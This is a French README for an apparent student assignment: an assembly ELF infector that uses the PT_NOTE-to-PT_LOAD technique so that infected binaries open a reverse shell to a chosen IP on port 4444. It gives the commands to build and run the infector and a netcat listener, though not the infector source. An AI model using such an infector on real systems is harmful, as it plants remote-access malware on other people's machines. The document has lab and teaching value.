# tp_note-tp_load-asm

**Lucas MILLER 3SI4**

Ce projet est un programme d'infection d'ELF à travers la méthode pt_note to pt_load.

Il n'est **pas** nécessaire de désactiver l'ASLR.
Ce programme est dynamique et ne nécessite donc pas de modifier le code lors de l'utilisation sur un autre programme.
Une fois infecté, le programme va, lors de son lancement, exécuter un reverse shell sur l'IP choisie.
L'IP peut être choisie lors du lancement, mais le port sera toujours 4444.

Il fonctionne sur les ELF avec les arguments -no-pie.

### Voici les commandes à lancer pour vérifier son bon fonctionnement.

Compiler le programme sain. Il peut être modifié en amont.
```
gcc -no-pie saine-code/safe_code.c -o saine-code/safe_code
```

Compilation de l'infecteur :
Il se compile ainsi :
```
nasm -f elf64 -o main/pt_note_to_pt_load_infector.o main/pt_note_to_pt_load_infector.s && ld -o main/pt_note_to_pt_load_infector main/pt_note_to_pt_load_infector.o
```
Puis lancement du programme :
Il va infecter le programme donné en argument
```
main/pt_note_to_pt_load_infector saine-code/safe_code
```

## Pour vérifier le reverse shell : 
```
saine-code/safe_code
```

Éxécution normal du programme

```
saine-code/safe_code
```

En parallèle :

```
nc -lnvp 4444

```


